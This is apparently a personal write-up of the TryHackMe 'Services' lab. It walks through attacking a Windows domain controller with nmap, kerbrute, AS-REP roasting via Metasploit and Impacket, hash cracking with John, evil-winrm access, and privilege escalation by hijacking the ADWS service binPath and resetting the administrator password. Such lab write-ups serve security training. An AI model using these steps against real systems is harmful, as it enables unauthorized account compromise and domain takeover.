<h1 align="center">Services</h1>
<p align="center">2025, August 6<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>457</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>At your service.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/a0573e91-02c9-4412-ac8c-323b44c09e06"><br>
Access this CTF clicking <a href="https://tryhackme.com/room/services">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/8c4deba1-721c-42e5-bd01-6a004f64b2f5"></p>


<br>
<h2>Task 1 . Get the user and root flag</h2>
<p>Meet the team!<br>

Whenever you are ready, click on the Start Machine button to fire up the Virtual Machine. Please allow 3-5 minutes for the VM to fully start.</p>

<p><em>Answer the questions below</em></p>

<br>

<h3>Nmap</h3>

```bash 
:~/Services# nmap -sT -p- -T4 TargetIP
...
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49684/tcp open  unknown
49685/tcp open  unknown
49691/tcp open  unknown
49703/tcp open  unknown
```

```bash
:~/Services# nmap -sT -sC -sV -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Above Services
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-06 xx:xx:xxZ)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-06Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Not valid before: 2025-08-05Txx:xx:xx
|_Not valid after:  2026-02-04Txx:xx:xx
|_ssl-date: 2025-08-06Txx:xx:xx+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
```

<br>

<h3>Web 80</h3>

<img width="606" height="604" alt="image" src="https://github.com/user-attachments/assets/2fb69927-9b6a-446d-9726-0eaaa0427b34" />

<p>

- j.doe@services.local</p>

<img width="593" height="771" alt="image" src="https://github.com/user-attachments/assets/2bfe15e9-ff8b-41b3-aa3a-f422432c0ee9" />

<br>

<h3>/etc/hosts</h3>

```bash
TargetIP    services.local
```

<br>

<h3>/about.html</h3>

<p>

- Joanne Doe</p>

<img width="1256" height="552" alt="image" src="https://github.com/user-attachments/assets/43e16a80-9fab-408e-8df2-a936215000cc" />

<p>

- Joanne Doe = <code>j.doe</code><br>
- Jack Rock = <code>j.rock</code><br>
- Will Masters = <code>w.masters</code><br>
- Johnny LaRusso = <code>j.larusso</code></p>

<br>

<h3>kerbrute</h3>

```bash
:~/Services# kerbrute userenum --dc TargetIP -d services.local users.txt
...
2025/08/06 xx:xx:xx >  [+] VALID USERNAME:	 j.larusso@services.local
2025/08/06 xx:xx:xx >  [+] VALID USERNAME:	 j.doe@services.local
2025/08/06 xx:xx:xx >  [+] VALID USERNAME:	 w.masters@services.local
2025/08/06 xx:xx:xx >  [+] VALID USERNAME:	 j.rock@services.local
```

<br>

<h3>msfconsole</h3>

```bash
msf6> search kerberos
...
```

```bash
msf6 > use 9
msf6 auxiliary(scanner/kerberos/kerberos_login) > set domain services.local
domain => services.local
msf6 auxiliary(scanner/kerberos/kerberos_login) > set rhosts TargetIP
rhosts => TargetIP
msf6 auxiliary(scanner/kerberos/kerberos_login) > set user_file users.txt
user_file => users.txt
```

```bash
msf6 auxiliary(scanner/kerberos/kerberos_login) > run
[*] Using domain: SERVICES.LOCAL - TargetIP:88      ...
[+] TargetIP - User: "j.doe" is present
[+] TaregTIP - User: "j.rock" does not require preauthentication. Hash: $krb5asrep$23$j.rock@SERVICES.LOCAL:d45c62ec**********8d975f003bf7a7$4a10438a2e24e90c576c71ec0d31d657cca97232057143bfd7f6503ff923e0cb387da32f75fb72cfc975e2226cbf090defcd39350a4c59d616ad52fcfa138676c0e15ce9c957de762b52bdb92ef2d21b311dd7e5c5d89c5b853791db9ed2198714f3577b0bc2bc72909b8b7eb6e4194bfd928d94492c5b8c22867deaa36663ef6cfbac4942e95cfd0e98ec8a8bd55aaecb853f8eadeb0f0174e91136d49b9a57abc3915f8eeb636aad128dc0b83bd559cc04f1bf0a270f834035bd7a1eeac3eabdc5a332ba55d452c9c029a35fb7466fb1ef4e733d6f1d8a8821fd24cfc778d4e5f1ae43b4b9a375f2525ea5773cbe
[+] TargetIP - User: "w.masters" is present
[+] TargetIP - User: "j.larusso" is present
[*] Auxiliary module execution completed
```

<br>

<h3>John the Ripper</h3>

```bash
:~/Services# john hash --wordlist=/usr/share/wordlists/rockyou.txt
...
*************    ($krb5asrep$23$j.rock@SERVICES.LOCAL)
...
```

<br>

<h3>GetNPUsers</h3>

```bash
:~/Services# python3.9 /opt/impacket/build/scripts-3.9/GetNPUsers.py services.local/j.rock -dc-ip TargetIP -no-pass
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Getting TGT for j.rock
$krb5asrep$23$j.rock@SERVICES.LOCAL:c8050bc1fe843df3d686f**********6$34577ee52d8819425876752a9abf85549722283953dafb74007c4e8e8cd574c9b5ad11405068e8dff9e9a5e318349d56b1413a0b27ed5a094a05a835a5744c45f63009c19c198f8f1953b57606e2fd2bc3999aa2f17a0f8afce46a0eb2a3e69b8f9d0a764af2862c3be3ab6962239146fd3540f790f3141bc791ff8a92ba0f9a89dfa9670c6ab0bd69c5374763fc2f04da9a468faa966c39339e08726535a3332a70ac84602d94abc72af1930eaeb5538f685984fc9eba9c1be94b6edcce94bbc0030d5e7b3b37d8ad3c1abfd06eecc6d507054c9faaf3757ca2923803f2f9414f9b173f183d1f7cdb951050c8a6ed01
```

<br>

<h3>John the Ripper</h3>

```bash
:~/Services# john hash1 --wordlist=/usr/share/wordlists/rockyou.txt
...
*************    ($krb5asrep$23$j.rock@SERVICES.LOCAL)
...
```

<br>

<p><code>j.rock</code> : <code>*************</code></p>

<br>

<h3>evil-winrm</h3>

```bash
:~/Services# evil-winrm -u j.rock -p '*************' -i TargetIP
...                                        
*Evil-WinRM* PS C:\Users\j.rock> dir


    Directory: C:\Users\j.rock


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        2/15/2023   5:55 AM                Desktop
d-r---        2/15/2023   5:48 AM                Documents
d-r---        9/15/2018   7:19 AM                Downloads
d-r---        9/15/2018   7:19 AM                Favorites
d-r---        9/15/2018   7:19 AM                Links
d-r---        9/15/2018   7:19 AM                Music
d-r---        9/15/2018   7:19 AM                Pictures
d-----        9/15/2018   7:19 AM                Saved Games
d-r---        9/15/2018   7:19 AM                Videos
```


```bash
*Evil-WinRM* PS C:\Users\j.rock\Desktop> dir


    Directory: C:\Users\j.rock\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        2/15/2023   5:55 AM             44 user.txt


*Evil-WinRM* PS C:\Users\j.rock\Desktop> type user.txt
THM{**************}
```

<br>

<p>1.1. What is the user flag?<br>
<code>THM{**************}</code></p>

<br>

<br>

<h4>identified groups</h4>

```bash
*Evil-WinRM* PS C:\Users\j.rock\Desktop> whoami / groups
...
```

<h4>checked services</h4>
<p>

- ADWS (Active Directory Web Services) running with privileges
</p>

```bash
*Evil-WinRM* PS C:\Users\j.rock\Desktop> services
...
```

```bash
*Evil-WinRM* PS C:\Windows\ADWS\ icacls C:\Windows\ADWS
...
```

<h4>added j.rock to administrators´</h4>

```bash
PS C:\Users\j.rock\Desktop> sc.exe config adws binPath= "net localgroup administrators j.rock /add"
[SC] ChangeServiceConfig SUCCESS
```

<h4>stopped adws</h4>

```bash
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe stop adws

SERVICE_NAME: adws
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

<h4>started adws</h4>

```bash
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe start adws
[SC] StartService FAILED 1053:
```

<h4>queried adws</h4>

```bash
*Evil-WinRM* PS C:\Users\Administrator> sc.exe query adws

SERVICE_NAME: adws
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
```

<h4>exited</h4>

```bash
*Evil-WinRM* PS C:\Users\Administrator> exit                                        
```

<h4>logged as j.rock</h4>

```bash
:~/Services# evil-winrm -u j.rock -p '*************' -i TargetIP
...                                        
Info: Establishing connection to remote endpoint
```

<h4>queried adws</h4>

```bash
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe query adws

SERVICE_NAME: adws
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
```

<h4>tried to catt root.txt --> denied</h4>

<h4>changed administrator´s password</h4>

```bash
*Evil-WinRM* PS C:\users\administrator\desktop> net user administrator anything123
The command completed successfully.
```

<h4>exited</h4>

```bash
PS C:\users\administrator\desktop> exit
```

<h4>logged in as administrator</h4>

```bash
:~/Services# evil-winrm -u administrator -p 'anything123' -i TargetIP
...                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        2/15/2023   5:53 AM             48 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
THM{****************}
```

<br>

<p>1.2. What is the Administrator flag?<br>
<code>THM{****************}</code></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/57b3d10e-6ee0-4d3e-b224-f6f22361bdaa"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/06af2d92-4f59-4e9b-8332-907791d61fef"></p>


<img width="1893" height="898" alt="image" src="https://github.com/user-attachments/assets/32ec7b03-8a80-4f40-88e4-b0d458ab3cb4" />


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 6    |   457    |     131ˢᵗ    |      5ᵗʰ     |     543ʳᵈ   |    10ᵗʰ    | 119,450  |    900    |    73     |


</div>

<p align="center">Global All Time:   131ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/d0b6496e-920b-4030-876d-1f14ec4c4d2a"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/2ed131c6-0bbc-455d-9283-f68b695897fd"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/cdd38d91-5feb-4414-a772-a984eaca57f1"><br>
                  Global monthly:    543ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/7d97ddfd-fc9e-4557-a972-1406fccece88"><br>
                  Brazil monthly:     10ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/9b0fdae1-78a1-4695-b3e7-5aaff58747a4"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
